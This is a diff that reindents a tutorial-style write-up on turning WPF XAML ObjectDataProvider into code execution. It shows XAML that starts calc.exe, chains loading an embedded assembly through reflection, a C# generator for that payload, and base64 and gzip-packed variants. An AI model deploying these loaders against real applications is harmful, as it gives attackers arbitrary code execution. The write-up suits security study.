@@ -29,20 +29,20 @@ Here is a XAML markup for a simple WPF application with a label and a button.
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         xmlns:local="clr-namespace:WpfAppTest"
         Title="MainWindow" Height="300" Width="300">
-    <Grid>
-        <Label x:Name="MyLabel"
-               Content="Label"
-               Width="40"
-               Height="30"
-               HorizontalAlignment="Center"
-               VerticalAlignment="Top"
-               Margin="0,80,0,0" />
-        <Button x:Name="MyBytton"
-                Width="100"
-                Height="30"
-                Content="Button"
-                HorizontalContentAlignment="Center" />
-    </Grid>
+  <Grid>
+    <Label x:Name="MyLabel"
+           Content="Label"
+           Width="40"
+           Height="30"
+           HorizontalAlignment="Center"
+           VerticalAlignment="Top"
+           Margin="0,80,0,0" />
+    <Button x:Name="MyBytton"
+            Width="100"
+            Height="30"
+            Content="Button"
+            HorizontalContentAlignment="Center" />
+  </Grid>
 </Window>
 ```
 
@@ -69,18 +69,18 @@ using System.Windows;
 
 namespace WpfAppTest
 {
-	public partial class MainWindow : Window
-	{
-		public MainWindow()
-		{
-			InitializeComponent();
-		}
+  public partial class MainWindow : Window
+  {
+    public MainWindow()
+    {
+      InitializeComponent();
+    }
 
-		private void Button_Click(object sender, RoutedEventArgs e)
-		{
-			MyLabel.Content = "Click";
-		}
-	}
+    private void Button_Click(object sender, RoutedEventArgs e)
+    {
+      MyLabel.Content = "Click";
+    }
+  }
 }
 ```
 
@@ -95,14 +95,14 @@ Suppose we have some a method in our code that returns a list of strings:
 ```csharp
 namespace WpfAppTest
 {
-  	...
-	public class Data
-	{
-		public static Array GetMyStrings()
-		{
-			return new string[] { "One", "Two", "Three" };
-		}
-	}
+  ...
+  public class Data
+  {
+    public static Array GetMyStrings()
+    {
+      return new string[] { "One", "Two", "Three" };
+    }
+  }
 }
 ```
 
@@ -133,10 +133,10 @@ To connect data from the `GetMyStrings` method to the `ListBox`, we can add an `
         Title="MainWindow" Height="300" Width="300">
         
 +   <Window.Resources>
-+   	 <ObjectDataProvider x:Key="myListItems"
-+                          ObjectType="{x:Type local:Data}"
-+                          MethodName="GetMyStrings">
-+      </ObjectDataProvider>
++     <ObjectDataProvider x:Key="myListItems"
++                         ObjectType="{x:Type local:Data}"
++                         MethodName="GetMyStrings">
++     </ObjectDataProvider>
 +   </Window.Resources>
   
     <Grid>
@@ -151,16 +151,16 @@ Now we can use the created `ObjectDataProvider` as `ItemSource` for `ListBox` us
 ```diff
 <!-- MainWindow.xaml -->
 <Window ...>
-    <Grid>
-      ...
-      <ListBox x:Name="MyListBox"
-+              ItemsSource="{Binding Source={StaticResource myListItems}}"
-               Width="100"
-               Height="100"
-               HorizontalAlignment="Center"
-               VerticalAlignment="Bottom"
-               Margin="0,0,0,10" />
-    </Grid>
+  <Grid>
+    ...
+    <ListBox x:Name="MyListBox"
++            ItemsSource="{Binding Source={StaticResource myListItems}}"
+             Width="100"
+             Height="100"
+             HorizontalAlignment="Center"
+             VerticalAlignment="Bottom"
+             Margin="0,0,0,10" />
+  </Grid>
 </Window>
 ```
 
@@ -190,24 +190,25 @@ public class Data
 Now we can modify the XAML file to provide a `filter` argument to this method:
 
 ```diff
-<Window x:Class="WpfAppTest.MainWindow"
-        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
-        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-+       xmlns:s="clr-namespace:System;assembly=mscorlib"
-        xmlns:local="clr-namespace:WpfAppTest"
-        Title="MainWindow" Height="300" Width="300">
-        
-    <Window.Resources>
-        <ObjectDataProvider x:Key="myListItems"
-                            ObjectType="{x:Type local:Data}"
-                            MethodName="GetMyStrings">
-+            <ObjectDataProvider.MethodParameters>
-+                <s:String>e</s:String>
-+            </ObjectDataProvider.MethodParameters>
-        </ObjectDataProvider>
-    </Window.Resources>   
+Window x:Class="WpfAppTest.MainWindow"
+       xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+       xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
++      xmlns:s="clr-namespace:System;assembly=mscorlib"
+       xmlns:local="clr-namespace:WpfAppTest"
+       Title="MainWindow" Height="300" Width="300">
     
-    ...
+  <Window.Resources>
+    <ObjectDataProvider x:Key="myListItems"
+                        ObjectType="{x:Type local:Data}"
+                        MethodName="GetMyStrings">
++      <ObjectDataProvider.MethodParameters>
++        <s:String>e</s:String>
++      </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+  </Window.Resources>   
+  
+  ...
+
 ```
 
 As you can see, to be able to use the `System.String` type we need to define `xmlns` on the `Window` tag with the value `clr-namespace:System;assembly=mscorlib`. After that `System.String` could be accessed as `s:String`. So by declaring `xmlns` on the root element of the XAML, we are able to import any DLL on the system.
@@ -222,24 +223,24 @@ If we can execute any method from our code, is it possible to execute, for examp
 +       xmlns:d="clr-namespace:System.Diagnostics;assembly=System"
         xmlns:local="clr-namespace:WpfAppTest"
         Title="MainWindow" Height="300" Width="300">
-        
-    <Window.Resources>
--        <ObjectDataProvider x:Key="myListItems"
--                            ObjectType="{x:Type local:Data}"
--                            MethodName="GetMyStrings">
--            <ObjectDataProvider.MethodParameters>
--                <s:String>e</s:String>
--            </ObjectDataProvider.MethodParameters>
--        </ObjectDataProvider>
-+        <ObjectDataProvider x:Key="myListItems"
-+                            ObjectType="{x:Type d:Process}"
-+                            MethodName="Start">
-+            <ObjectDataProvider.MethodParameters>
-+                <s:String>calc.exe</s:String>
-+            </ObjectDataProvider.MethodParameters>
-+        </ObjectDataProvider>
-    </Window.Resources>
     
+  <Window.Resources>
+-    <ObjectDataProvider x:Key="myListItems"
+-                        ObjectType="{x:Type local:Data}"
+-                        MethodName="GetMyStrings">
+-      <ObjectDataProvider.MethodParameters>
+-        <s:String>e</s:String>
+-      </ObjectDataProvider.MethodParameters>
+-    </ObjectDataProvider>
++    <ObjectDataProvider x:Key="myListItems"
++                        ObjectType="{x:Type d:Process}"
++                        MethodName="Start">
++      <ObjectDataProvider.MethodParameters>
++        <s:String>calc.exe</s:String>
++      </ObjectDataProvider.MethodParameters>
++    </ObjectDataProvider>
+  </Window.Resources>
+
     ...
 ```
 
@@ -350,9 +351,9 @@ As we already know, `ObjectDataProvider` can be used to execute static methods o
 <ObjectDataProvider x:Key="calc"
                     ObjectType="{x:Type d:Process}"
                     MethodName="Start">
-    <ObjectDataProvider.MethodParameters>
-        <s:String>calc.exe</s:String>
-    </ObjectDataProvider.MethodParameters>
+  <ObjectDataProvider.MethodParameters>
+    <s:String>calc.exe</s:String>
+  </ObjectDataProvider.MethodParameters>
 </ObjectDataProvider>
 
 </ResourceDictionary>
@@ -363,42 +364,42 @@ Now let's look at other useful features of the `ObjectDataProvider`, such as the
 ```csharp
 public class DataObject
 {
-	public string[] items;
+  public string[] items;
 
-	public DataObject(string[] items)
-	{
-		this.items = items;
-	}
+  public DataObject(string[] items)
+  {
+    this.items = items;
+  }
 
-	public string[] GetItems(int count)
-	{
-		return items.Take(count).ToArray();
-	}
+  public string[] GetItems(int count)
+  {
+    return items.Take(count).ToArray();
+  }
 }
 ```
 
 Let's imagine that we want to create an instance of `DataObject` using the `ObjectDataProvider` and then create another `ObjectDataProvider`, which calls the `GetItems` method on the created instance. We can do it like this:
 
 ```xml
-<ObjectDataProvider x:Key="dataObject"
-                    ObjectType="{x:Type local:DataObject}">
-    <ObjectDataProvider.ConstructorParameters>
-        <x:Array Type="{x:Type s:String}">
-            <s:String>1</s:String>
-            <s:String>2</s:String>
-            <s:String>3</s:String>
-            <s:String>4</s:String>
-        </x:Array>
-    </ObjectDataProvider.ConstructorParameters>
+<ResourceDictionary
+	  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+	  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+	  xmlns:local="clr-namespace:XamlTest;assembly=XamlTest">
+
+<ObjectDataProvider x:Key="first"
+                    ObjectType="{x:Type local:First}">
+  <ObjectDataProvider.ConstructorParameters>
+	</ObjectDataProvider.ConstructorParameters>
 </ObjectDataProvider>
 
-<ObjectDataProvider x:Key="myListItems"
-                    ObjectInstance="{StaticResource dataObject}"
-                    MethodName="GetItems">
-    <ObjectDataProvider.MethodParameters>
-        <s:Int32>3</s:Int32>
-    </ObjectDataProvider.MethodParameters>
+<ObjectDataProvider x:Key="second"
+                    ObjectType="{x:Type local:Second}">
+  <ObjectDataProvider.ConstructorParameters>
+    <StaticResource ResourceKey="first" />
+  </ObjectDataProvider.ConstructorParameters>
 </ObjectDataProvider>
+
+</ResourceDictionary>
 ```
 
 Here we've used a several new important features of `ObjectDataProvider`:
@@ -414,15 +415,15 @@ Suppose we have two classes, `First` and `Second` defined as follows:
 ```csharp
 public class First
 {
-	public First() { }
+  public First() { }
 }
 
 public class Second
 {
-	public Second(object first)
-	{
-		Console.WriteLine(first);
-	}
+  public Second(object first)
+  {
+    Console.WriteLine(first);
+  }
 }
 ```
 
@@ -443,15 +444,15 @@ If we rewrite this as XAML using `ObjectDataProvider`, we get something like thi
 
 <ObjectDataProvider x:Key="first"
                     ObjectType="{x:Type local:First}">
-	  <ObjectDataProvider.ConstructorParameters>
-	  </ObjectDataProvider.ConstructorParameters>
+  <ObjectDataProvider.ConstructorParameters>
+	</ObjectDataProvider.ConstructorParameters>
 </ObjectDataProvider>
 
 <ObjectDataProvider x:Key="second"
                     ObjectType="{x:Type local:Second}">
-      <ObjectDataProvider.ConstructorParameters>
-			    <StaticResource ResourceKey="first" />
-      </ObjectDataProvider.ConstructorParameters>
+  <ObjectDataProvider.ConstructorParameters>
+    <StaticResource ResourceKey="first" />
+  </ObjectDataProvider.ConstructorParameters>
 </ObjectDataProvider>
 
 </ResourceDictionary>
@@ -480,10 +481,10 @@ using System.Diagnostics;
 
 public class Payload
 {
-		public static void Run()
-		{
-				Process.Start("calc");
-		}
+  public static void Run()
+  {
+    Process.Start("calc");
+  }
 }
 ```
 
@@ -501,12 +502,12 @@ To create an array of assembly bytes we can use the `x:Array` XAML extension. It
 <ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
                     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
 >
-    <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
-    <x:Array x:Key="data" Type="{x:Type x:Byte}">
-        <x:Byte>77</x:Byte>
-        <!-- ... 3582 lines ... -->
-        <x:Byte>0</x:Byte>
-  	</x:Array>
+  <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
+  <x:Array x:Key="data" Type="{x:Type x:Byte}">
+    <x:Byte>77</x:Byte>
+    <!-- ... 3582 lines ... -->
+    <x:Byte>0</x:Byte>
+  </x:Array>
 </ResourceDictionary>
 ```
 
@@ -522,21 +523,20 @@ index 4d3aa6b..b6433bf 100644
                      xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
 +                    xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib"
  >
-     <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
-     <x:Array x:Key="data" Type="{x:Type x:Byte}">
+   <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
+   <x:Array x:Key="data" Type="{x:Type x:Byte}">
 @@ -7,4 +8,11 @@
-         <!-- ... 3582 lines ... -->
-         <x:Byte>0</x:Byte>
-     </x:Array>
+     <!-- ... 3582 lines ... -->
+     <x:Byte>0</x:Byte>
+   </x:Array>
 +
-+    <!-- Assembly assembly = Assembly.Load(data); -->
-+    <ObjectDataProvider x:Key="assembly" ObjectType="{x:Type r:Assembly}" MethodName="Load">
-+        <ObjectDataProvider.MethodParameters>
-+          <StaticResource ResourceKey="data"></StaticResource>
-+        </ObjectDataProvider.MethodParameters>
-+    </ObjectDataProvider>
++  <!-- Assembly assembly = Assembly.Load(data); -->
++  <ObjectDataProvider x:Key="assembly" ObjectType="{x:Type r:Assembly}" MethodName="Load">
++    <ObjectDataProvider.MethodParameters>
++      <StaticResource ResourceKey="data"></StaticResource>
++    </ObjectDataProvider.MethodParameters>
++  </ObjectDataProvider>
  </ResourceDictionary>
-
 
 ```
 
@@ -553,19 +553,19 @@ index edb5802..e038bf4 100644
                      xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib"
 +                    xmlns:s="clr-namespace:System;assembly=mscorlib"
  >
-     <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
-     <x:Array x:Key="data" Type="{x:Type x:Byte}">
+   <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
+   <x:Array x:Key="data" Type="{x:Type x:Byte}">
 @@ -15,4 +16,11 @@
-           <StaticResource ResourceKey="data"></StaticResource>
-         </ObjectDataProvider.MethodParameters>
-     </ObjectDataProvider>
+       <StaticResource ResourceKey="data"></StaticResource>
+     </ObjectDataProvider.MethodParameters>
+   </ObjectDataProvider>
 +
-+    <!-- Type type = assembly.GetType("MyType"); -->
-+    <ObjectDataProvider x:Key="type" ObjectInstance="{StaticResource assembly}" MethodName="GetType">
-+        <ObjectDataProvider.MethodParameters>
-+            <s:String>Payload</s:String>
-+        </ObjectDataProvider.MethodParameters>
-+    </ObjectDataProvider>
++  <!-- Type type = assembly.GetType("MyType"); -->
++  <ObjectDataProvider x:Key="type" ObjectInstance="{StaticResource assembly}" MethodName="GetType">
++    <ObjectDataProvider.MethodParameters>
++      <s:String>Payload</s:String>
++    </ObjectDataProvider.MethodParameters>
++  </ObjectDataProvider>
  </ResourceDictionary>
 ```
 
@@ -577,17 +577,17 @@ index e038bf4..157d2da 100644
 --- a/3.xaml
 +++ b/4.xaml
 @@ -23,4 +23,12 @@
-             <s:String>Payload</s:String>
-         </ObjectDataProvider.MethodParameters>
-     </ObjectDataProvider>
+       <s:String>Payload</s:String>
+     </ObjectDataProvider.MethodParameters>
+   </ObjectDataProvider>
 +
-+    <!-- MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public); -->
-+    <ObjectDataProvider x:Key="method" ObjectInstance="{StaticResource type}" MethodName="GetMethod">
-+        <ObjectDataProvider.MethodParameters>
-+            <s:String>Run</s:String>
-+            <r:BindingFlags>24</r:BindingFlags>
-+        </ObjectDataProvider.MethodParameters>
-+    </ObjectDataProvider>
++  <!-- MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public); -->
++  <ObjectDataProvider x:Key="method" ObjectInstance="{StaticResource type}" MethodName="GetMethod">
++    <ObjectDataProvider.MethodParameters>
++      <s:String>Run</s:String>
++      <r:BindingFlags>24</r:BindingFlags>
++    </ObjectDataProvider.MethodParameters>
++  </ObjectDataProvider>
  </ResourceDictionary>
 ```
 
@@ -599,17 +599,17 @@ index 157d2da..2e5b432 100644
 --- a/4.xaml
 +++ b/5.xaml
 @@ -31,4 +31,12 @@
-             <r:BindingFlags>24</r:BindingFlags>
-         </ObjectDataProvider.MethodParameters>
-     </ObjectDataProvider>
+       <r:BindingFlags>24</r:BindingFlags>
+     </ObjectDataProvider.MethodParameters>
+   </ObjectDataProvider>
 +
-+    <!-- method.Invoke(null, new object[] {}); -->
-+    <ObjectDataProvider x:Key="invoke" ObjectInstance="{StaticResource method}" MethodName="Invoke">
-+        <ObjectDataProvider.MethodParameters>
-+            <x:Null></x:Null>
-+            <x:Array Type="{x:Type s:Object}"></x:Array>
-+        </ObjectDataProvider.MethodParameters>
-+    </ObjectDataProvider>
++  <!-- method.Invoke(null, new object[] {}); -->
++  <ObjectDataProvider x:Key="invoke" ObjectInstance="{StaticResource method}" MethodName="Invoke">
++    <ObjectDataProvider.MethodParameters>
++      <x:Null></x:Null>
++      <x:Array Type="{x:Type s:Object}"></x:Array>
++    </ObjectDataProvider.MethodParameters>
++  </ObjectDataProvider>
  </ResourceDictionary>
 ```
 
@@ -621,42 +621,42 @@ Here is how the final payload looks like:
                     xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib"
                     xmlns:s="clr-namespace:System;assembly=mscorlib"
 >
-    <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
-    <x:Array x:Key="data" Type="{x:Type x:Byte}">
-        <x:Byte>77</x:Byte>
-        <!-- ... 3582 lines ... -->
-        <x:Byte>0</x:Byte>
-    </x:Array>
+  <!-- byte[] data = new byte[] { /*... Payload.dll bytes ...*/ }; -->
+  <x:Array x:Key="data" Type="{x:Type x:Byte}">
+    <x:Byte>77</x:Byte>
+    <!-- ... 3582 lines ... -->
+    <x:Byte>0</x:Byte>
+  </x:Array>
 
-    <!-- Assembly assembly = Assembly.Load(data); -->
-    <ObjectDataProvider x:Key="assembly" ObjectType="{x:Type r:Assembly}" MethodName="Load">
-        <ObjectDataProvider.MethodParameters>
-          <StaticResource ResourceKey="data"></StaticResource>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- Assembly assembly = Assembly.Load(data); -->
+  <ObjectDataProvider x:Key="assembly" ObjectType="{x:Type r:Assembly}" MethodName="Load">
+    <ObjectDataProvider.MethodParameters>
+      <StaticResource ResourceKey="data"></StaticResource>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
 
-    <!-- Type type = assembly.GetType("MyType"); -->
-    <ObjectDataProvider x:Key="type" ObjectInstance="{StaticResource assembly}" MethodName="GetType">
-        <ObjectDataProvider.MethodParameters>
-            <s:String>Payload</s:String>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- Type type = assembly.GetType("MyType"); -->
+  <ObjectDataProvider x:Key="type" ObjectInstance="{StaticResource assembly}" MethodName="GetType">
+    <ObjectDataProvider.MethodParameters>
+      <s:String>Payload</s:String>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
 
-    <!-- MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public); -->
-    <ObjectDataProvider x:Key="method" ObjectInstance="{StaticResource type}" MethodName="GetMethod">
-        <ObjectDataProvider.MethodParameters>
-            <s:String>Run</s:String>
-            <r:BindingFlags>24</r:BindingFlags>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public); -->
+  <ObjectDataProvider x:Key="method" ObjectInstance="{StaticResource type}" MethodName="GetMethod">
+    <ObjectDataProvider.MethodParameters>
+      <s:String>Run</s:String>
+      <r:BindingFlags>24</r:BindingFlags>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
 
-    <!-- method.Invoke(null, new object[] {}); -->
-    <ObjectDataProvider x:Key="invoke" ObjectInstance="{StaticResource method}" MethodName="Invoke">
-        <ObjectDataProvider.MethodParameters>
-            <x:Null></x:Null>
-            <x:Array Type="{x:Type s:Object}"></x:Array>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- method.Invoke(null, new object[] {}); -->
+  <ObjectDataProvider x:Key="invoke" ObjectInstance="{StaticResource method}" MethodName="Invoke">
+    <ObjectDataProvider.MethodParameters>
+      <x:Null></x:Null>
+      <x:Array Type="{x:Type s:Object}"></x:Array>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
 </ResourceDictionary>
 ```
 
@@ -672,74 +672,74 @@ using System.Windows.Markup;
 
 namespace XAMLTests
 {
-    internal class Program
+  internal class Program
+  {
+    static void Main(string[] args)
     {
-        static void Main(string[] args)
-        {
-            var assemblyBytes = BuildAssembly();
-            var xaml = AssemblyLoad(assemblyBytes);
-            Console.WriteLine(xaml);
-            Console.ReadKey();
+      var assemblyBytes = BuildAssembly();
+      var xaml = AssemblyLoad(assemblyBytes);
+      Console.WriteLine(xaml);
+      Console.ReadKey();
 
-            XamlReader.Parse(xaml);
-        }
+      XamlReader.Parse(xaml);
+    }
 
-        static byte[] BuildAssembly()
-        {
-            string code = @"
+    static byte[] BuildAssembly()
+    {
+      string code = @"
 using System.Diagnostics;
 
 public class Payload
 {
-        public static void Run()
-        {
-                Process.Start(""calc"");
-        }
+    public static void Run()
+    {
+        Process.Start(""calc"");
+    }
 }
 ";
 
-            CompilerParameters compilerParameters = new CompilerParameters();
-            compilerParameters.GenerateInMemory = true;
-            compilerParameters.TreatWarningsAsErrors = false;
-            compilerParameters.GenerateExecutable = false;
-            compilerParameters.CompilerOptions = "/target:library /optimize";
-            compilerParameters.ReferencedAssemblies.AddRange(new string[]
-            {
-                "mscorlib.dll",
-                "System.dll"
-            });
-            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
-            CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, code);
+      CompilerParameters compilerParameters = new CompilerParameters();
+      compilerParameters.GenerateInMemory = true;
+      compilerParameters.TreatWarningsAsErrors = false;
+      compilerParameters.GenerateExecutable = false;
+      compilerParameters.CompilerOptions = "/target:library /optimize";
+      compilerParameters.ReferencedAssemblies.AddRange(new string[]
+      {
+        "mscorlib.dll",
+        "System.dll"
+      });
+      CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
+      CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, code);
 
-            if (compilerResults.Errors.HasErrors)
-            {
-                string text = "Compile error: ";
-                foreach (CompilerError compilerError in compilerResults.Errors)
-                {
-                    text = text + "\n" + compilerError.ToString();
-                }
-
-                throw new Exception(text);
-            }
-
-            Assembly assembly = compilerResults.CompiledAssembly;
-
-            var pi = assembly.GetType().GetMethod("GetRawBytes", BindingFlags.Instance | BindingFlags.NonPublic);
-            byte[] assemblyBytes = (byte[])pi.Invoke(assembly, null);
-
-            return assemblyBytes;
+      if (compilerResults.Errors.HasErrors)
+      {
+        string text = "Compile error: ";
+        foreach (CompilerError compilerError in compilerResults.Errors)
+        {
+          text = text + "\n" + compilerError.ToString();
         }
 
-        static string AssemblyLoad(byte[] assemblyBytes)
-        {
-            StringBuilder assemblyXml = new StringBuilder();
+        throw new Exception(text);
+      }
 
-            foreach (var b in assemblyBytes)
-            {
-                assemblyXml.AppendLine(@"<x:Byte>" + b.ToString() + "</x:Byte>");
-            }
+      Assembly assembly = compilerResults.CompiledAssembly;
 
-            var xaml = @"<ResourceDictionary
+      var pi = assembly.GetType().GetMethod("GetRawBytes", BindingFlags.Instance | BindingFlags.NonPublic);
+      byte[] assemblyBytes = (byte[])pi.Invoke(assembly, null);
+
+      return assemblyBytes;
+    }
+
+    static string AssemblyLoad(byte[] assemblyBytes)
+    {
+      StringBuilder assemblyXml = new StringBuilder();
+
+      foreach (var b in assemblyBytes)
+      {
+        assemblyXml.AppendLine(@"<x:Byte>" + b.ToString() + "</x:Byte>");
+      }
+
+      var xaml = @"<ResourceDictionary
 xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
 xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
 xmlns:s=""clr-namespace:System;assembly=mscorlib""
@@ -748,34 +748,34 @@ xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
 <x:Array x:Key=""data"" Type=""{x:Type x:Byte}"">" + assemblyXml + @"</x:Array>
 
 <ObjectDataProvider x:Key=""assembly""  ObjectType=""{x:Type r:Assembly}"" MethodName=""Load"">
-    <ObjectDataProvider.MethodParameters>
-        <StaticResource ResourceKey=""data""></StaticResource>
-    </ObjectDataProvider.MethodParameters>
+  <ObjectDataProvider.MethodParameters>
+    <StaticResource ResourceKey=""data""></StaticResource>
+  </ObjectDataProvider.MethodParameters>
 </ObjectDataProvider>
 
 <ObjectDataProvider x:Key=""type"" ObjectInstance=""{StaticResource assembly}"" MethodName=""GetType"">
-    <ObjectDataProvider.MethodParameters>
-        <s:String>Payload</s:String>
-    </ObjectDataProvider.MethodParameters>
+  <ObjectDataProvider.MethodParameters>
+    <s:String>Payload</s:String>
+  </ObjectDataProvider.MethodParameters>
 </ObjectDataProvider>
 
 <ObjectDataProvider x:Key=""method"" ObjectInstance=""{StaticResource type}"" MethodName=""GetMethod"">
-    <ObjectDataProvider.MethodParameters>
-        <s:String>Run</s:String>
-        <r:BindingFlags>24</r:BindingFlags>
-    </ObjectDataProvider.MethodParameters>
+  <ObjectDataProvider.MethodParameters>
+    <s:String>Run</s:String>
+    <r:BindingFlags>24</r:BindingFlags>
+  </ObjectDataProvider.MethodParameters>
 </ObjectDataProvider>
 
 <ObjectDataProvider x:Key=""invoke"" ObjectInstance=""{StaticResource method}"" MethodName=""Invoke"">
-    <ObjectDataProvider.MethodParameters>
-        <x:Null></x:Null>
-        <x:Array Type=""{x:Type s:Object}""></x:Array>
-    </ObjectDataProvider.MethodParameters>
+  <ObjectDataProvider.MethodParameters>
+    <x:Null></x:Null>
+    <x:Array Type=""{x:Type s:Object}""></x:Array>
+  </ObjectDataProvider.MethodParameters>
 </ObjectDataProvider>
 </ResourceDictionary>";
-            return xaml;
-        }
+      return xaml;
     }
+  }
 }
 ```
 
@@ -810,9 +810,9 @@ index 2e5b432..acbfd97 100644
 -    </x:Array>
 +    <!-- Array data = Convert.FromBase64String("TVqQAAMAAAA...AAAA"); -->
 +    <s:Array x:Key="data" x:FactoryMethod="s:Convert.FromBase64String">
-+        <x:Arguments>
-+            <s:String>TVqQAAMAAAA...AAAA</s:String>
-+        </x:Arguments>
++      <x:Arguments>
++        <s:String>TVqQAAMAAAA...AAAA</s:String>
++      </x:Arguments>
 +    </s:Array>
  
      <!-- Assembly assembly = Assembly.Load(data); -->
@@ -853,74 +853,74 @@ We've replaced `gzipStream.CopyTo(outputStream)` here to get rid of the call `ou
                     xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib"
                     xmlns:i="clr-namespace:System.IO;assembly=mscorlib"
                     xmlns:c="clr-namespace:System.IO.Compression;assembly=System">
-    <!-- var data = Convert.FromBase64String("H4sIA...AAA=="); -->
-    <s:Array x:Key="data" x:FactoryMethod="s:Convert.FromBase64String">
-        <x:Arguments>
-            <s:String>H4sIA...AAA==</s:String>
-        </x:Arguments>
-    </s:Array>
-    
-    <!-- var inputStream = new MemoryStream(); -->
-    <i:MemoryStream x:Key="inputStream">
-        <x:Arguments>
-            <StaticResource ResourceKey="data"></StaticResource>
-        </x:Arguments>
-    </i:MemoryStream>
-    
-    <!-- var gzipStream = new GZipStream(inputStream, CompressionMode.Decompress); -->
-    <c:GZipStream x:Key="gzipStream">
-        <x:Arguments>
-            <StaticResource ResourceKey="inputStream"></StaticResource>
-            <c:CompressionMode>0</c:CompressionMode>
-        </x:Arguments>
-    </c:GZipStream>
-    
-    <!-- var buf = Array.CreateInstance(typeof(Byte), 3072); -->
-    <s:Array x:Key="buf" x:FactoryMethod="s:Array.CreateInstance">
-        <x:Arguments>
-            <x:Type TypeName="s:Byte" />
-            <x:Int32>3072</x:Int32>
-        </x:Arguments>
-    </s:Array>
+  <!-- var data = Convert.FromBase64String("H4sIA...AAA=="); -->
+  <s:Array x:Key="data" x:FactoryMethod="s:Convert.FromBase64String">
+    <x:Arguments>
+      <s:String>H4sIA...AAA==</s:String>
+    </x:Arguments>
+  </s:Array>
   
-    <!-- var tmp = gzipStream.Read(buf, 0, 3072); -->
-    <ObjectDataProvider x:Key="tmp" ObjectInstance="{StaticResource gzipStream}" MethodName="Read">
-        <ObjectDataProvider.MethodParameters>
-            <StaticResource ResourceKey="buf"></StaticResource>
-            <x:Int32>0</x:Int32>
-            <x:Int32>3072</x:Int32>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- var inputStream = new MemoryStream(); -->
+  <i:MemoryStream x:Key="inputStream">
+    <x:Arguments>
+      <StaticResource ResourceKey="data"></StaticResource>
+    </x:Arguments>
+  </i:MemoryStream>
   
-    <!-- Assembly assembly = Assembly.Load(buf); -->
-    <ObjectDataProvider x:Key="assembly" ObjectType="{x:Type r:Assembly}" MethodName="Load">
-        <ObjectDataProvider.MethodParameters>
-            <StaticResource ResourceKey="buf"></StaticResource>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- var gzipStream = new GZipStream(inputStream, CompressionMode.Decompress); -->
+  <c:GZipStream x:Key="gzipStream">
+    <x:Arguments>
+      <StaticResource ResourceKey="inputStream"></StaticResource>
+      <c:CompressionMode>0</c:CompressionMode>
+    </x:Arguments>
+  </c:GZipStream>
   
-    <!-- Type type = assembly.GetType("MyType"); -->
-    <ObjectDataProvider x:Key="type" ObjectInstance="{StaticResource assembly}" MethodName="GetType">
-        <ObjectDataProvider.MethodParameters>
-            <s:String>Payload</s:String>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- var buf = Array.CreateInstance(typeof(Byte), 3072); -->
+  <s:Array x:Key="buf" x:FactoryMethod="s:Array.CreateInstance">
+    <x:Arguments>
+      <x:Type TypeName="s:Byte" />
+      <x:Int32>3072</x:Int32>
+    </x:Arguments>
+  </s:Array>
   
-    <!-- MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public); -->
-    <ObjectDataProvider x:Key="method" ObjectInstance="{StaticResource type}" MethodName="GetMethod">
-        <ObjectDataProvider.MethodParameters>
-            <s:String>Run</s:String>
-            <r:BindingFlags>24</r:BindingFlags>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
+  <!-- var tmp = gzipStream.Read(buf, 0, 3072); -->
+  <ObjectDataProvider x:Key="tmp" ObjectInstance="{StaticResource gzipStream}" MethodName="Read">
+    <ObjectDataProvider.MethodParameters>
+      <StaticResource ResourceKey="buf"></StaticResource>
+      <x:Int32>0</x:Int32>
+      <x:Int32>3072</x:Int32>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
   
-    <!-- method.Invoke(null, new object[] {}); -->
-    <ObjectDataProvider x:Key="invoke" ObjectInstance="{StaticResource method}" MethodName="Invoke">
